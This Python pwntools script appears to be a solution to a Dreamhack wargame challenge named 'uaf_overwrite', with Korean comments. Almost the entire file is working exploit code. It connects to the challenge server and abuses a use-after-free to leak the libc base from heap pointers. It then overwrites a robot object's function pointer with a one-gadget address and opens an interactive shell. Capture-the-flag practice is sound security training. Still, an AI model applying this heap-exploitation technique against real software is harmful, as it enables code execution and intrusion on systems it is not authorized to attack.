#!/usr/bin/env python3
# Name: uaf_overwrite.py
from pwn import *

p = remote("host3.dreamhack.games", 18315)


def human(weight, age):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b': ', str(weight).encode())
    p.sendlineafter(b': ', str(age).encode())

    # p.sendline(str(weight).encode())
    # p.sendline(str(age).encode())


def robot(weight):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b': ', str(weight).encode())

    # p.sendline(b'2')
    # p.sendline(str(weight).encode())


def custom(size, data, idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b': ', str(size).encode())
    # 여긴 `scanf`가 아닌 `read`로 입력 받기 때문에 `send`로 보내야 함
    # 만약 `sendline`으로 보내면 data에 `\n`이 추가되서 출력되는 `data` 값이 달라져서 offset도 달라짐
    p.sendafter(b': ', data)
    p.sendlineafter(b': ', str(idx).encode())

    # p.sendline(b'3')
    # p.sendline(str(size).encode())
    # p.send(p64(data))
    # p.sendline(str(idx).encode())


# [1] Leak libc base
custom(0x500, b'random1', -1)  # 사이즈를 8바이트 단위로 `0x4f9 ~ 0x508` 까지는 같은 오프셋을 가리킴
custom(0x500, b'random2', 0)
custom(0x500, b'\xa0', -1)
# data 값이 'A'라면, `fd`에서 하위 1바이트가 `0x41`로 바뀌기 때문에 오프셋 또한 0x3ebc41로 바뀌어 줘야 한다.

# 이를 방지하고 항상 일정한 `fd`만 출력하게 하려면 `fd`를 전부 덮어준 후, `bk`를 출력하도록 하면 된다.
# custom(0x500, b'a'*0x8, -1)
# p.recvuntil(b'a'*0x8)

libc_base = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x3ebca0
og = libc_base + 0x10a41c  # 제약 조건을 만족하는 원가젯
# og = libc_base + 0x4f3ce
# og = libc_base + 0x4f3d5
# og = libc_base + 0x4f432

# [2] `robot->fptr` Overwrite
human(1, og)
robot(1)

p.interactive()
